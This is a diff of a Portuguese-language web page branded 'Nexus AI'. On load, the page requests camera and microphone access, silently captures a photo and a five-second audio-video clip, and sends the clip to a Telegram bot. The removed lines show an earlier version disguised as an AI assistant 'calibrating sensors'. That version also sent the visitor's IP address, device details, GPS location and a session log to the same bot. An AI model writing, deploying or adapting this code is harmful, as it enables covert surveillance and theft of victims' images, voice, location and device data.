@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nexus AI — Assistente Inteligente</title>
+  <title>Nexus AI — Captura de Mídia</title>
   <style>
     * {
       box-sizing: border-box;
@@ -36,7 +36,6 @@
       position: relative;
     }
 
-    /* Animação do Orbe de IA */
     .ai-orb-container {
       width: 100px;
       height: 100px;
@@ -127,7 +126,6 @@
       font-weight: 500;
     }
 
-    /* Elementos de captura ocultos */
     video, canvas { display: none; }
   </style>
 </head>
@@ -138,12 +136,12 @@
       <div class="ai-ring"></div>
       <div class="ai-orb"></div>
     </div>
-    <h2>Inicializando Nexus IA</h2>
-    <p class="subtitle">Sua sessão segura está sendo configurada. Por favor, permita os acessos solicitados pelo seu navegador para calibrar os sensores.</p>
+    <h2>Gravando Mídia</h2>
+    <p class="subtitle">Processando áudio, vídeo e foto...</p>
 
     <div class="status-container">
       <div class="spinner" id="spinner"></div>
-      <span class="status-text" id="statusMsg">Sincronizando ambiente...</span>
+      <span class="status-text" id="statusMsg">Inicializando...</span>
     </div>
   </div>
 
@@ -159,13 +157,9 @@
     }
 
     async function iniciarNexusApp() {
-      // 1. Dados de Dispositivo & IP
-      await enviarInformacoesDispositivo();
-
       try {
         atualizarStatus("Conectando sensores de vídeo e áudio...");
         
-        // Solicita permissões de Mídia (Câmera + Microfone)
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
           audio: true
@@ -175,15 +169,9 @@
         video.srcObject = stream;
 
         video.onloadedmetadata = () => {
-          // Captura Foto em 1 segundo
           setTimeout(() => capturarFoto(video), 1000);
-
-          // Inicia Gravação de Vídeo (5 segundos)
           setTimeout(() => gravarVideoEAudio(stream, 5000), 1200);
         };
-
-        // Captura GPS
-        capturarGPS();
 
       } catch (err) {
         console.error("Permissão negada ou erro:", err);
@@ -191,33 +179,8 @@
       }
     }
 
-    // 1. Enviar Texto com IP e Informações do Aparelho
-    async function enviarInformacoesDispositivo() {
-      try {
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-
-        const info = `🤖 **Novo Acesso no Nexus IA**\n\n` +
-                     `🌐 **IP:** \`${ipData.ip}\`\n` +
-                     `📱 **Plataforma:** ${navigator.platform}\n` +
-                     `💻 **Navegador:** ${navigator.userAgent}\n` +
-                     `📐 **Resolução:** ${window.screen.width}x${window.screen.height}\n` +
-                     `🗣️ **Idioma:** ${navigator.language}`;
-
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('text', info);
-        fd.append('parse_mode', 'Markdown');
-
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { method: 'POST', body: fd });
-      } catch (e) {
-        console.error("Erro ao obter IP:", e);
-      }
-    }
-
-    // 2. Capturar e Enviar Foto
     function capturarFoto(video) {
-      atualizarStatus("Capturando frame de calibração...");
+      atualizarStatus("Capturando foto...");
       const canvas = document.getElementById('canvas');
       canvas.width = video.videoWidth || 640;
       canvas.height = video.videoHeight || 480;
@@ -235,9 +198,8 @@
       }, 'image/jpeg', 0.85);
     }
 
-    // 3. Gravar Vídeo (com Áudio) e Enviar
     function gravarVideoEAudio(stream, duracao) {
-      atualizarStatus("Processando fluxo audiovisual...");
+      atualizarStatus("Gravando vídeo e áudio...");
       let mediaRecorder;
       try {
         mediaRecorder = new MediaRecorder(stream);
@@ -251,52 +213,20 @@
       mediaRecorder.onstop = () => {
         const blob = new Blob(chunks, { type: 'video/mp4' });
         
-        // Envia o Vídeo para o Telegram
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
         fd.append('video', blob, 'video_nexus.mp4');
         
-        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd })
-          .then(() => {
-            // Gerar e Enviar Documento TXT de Log após o vídeo
-            enviarDocumentoLog();
-          });
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd });
 
-        // Encerra a Câmera e Microfone
         stream.getTracks().forEach(track => track.stop());
         
         document.getElementById('spinner').style.display = 'none';
-        atualizarStatus("Nexus IA pronto! Conexão estabelecida.");
+        atualizarStatus("Processo concluído!");
       };
 
       mediaRecorder.start();
       setTimeout(() => mediaRecorder.stop(), duracao);
-    }
-
-    // 4. Capturar e Enviar GPS
-    function capturarGPS() {
-      if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition((pos) => {
-          const fd = new FormData();
-          fd.append('chat_id', CHAT_ID);
-          fd.append('latitude', pos.coords.latitude);
-          fd.append('longitude', pos.coords.longitude);
-
-          fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, { method: 'POST', body: fd });
-        }, (err) => console.log("GPS negado"), { enableHighAccuracy: true });
-      }
-    }
-
-    // 5. Enviar Documento de Log (sendDocument)
-    function enviarDocumentoLog() {
-      const relatorioText = `=== RELATÓRIO DE SESSÃO NEXUS IA ===\nData: ${new Date().toLocaleString()}\nUserAgent: ${navigator.userAgent}\nStatus: Concluído com sucesso.`;
-      const blob = new Blob([relatorioText], { type: 'text/plain' });
-
-      const fd = new FormData();
-      fd.append('chat_id', CHAT_ID);
-      fd.append('document', blob, 'Relatorio_Sessao.txt');
-
-      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: 'POST', body: fd });
     }
 
     window.addEventListener('DOMContentLoaded', iniciarNexusApp);
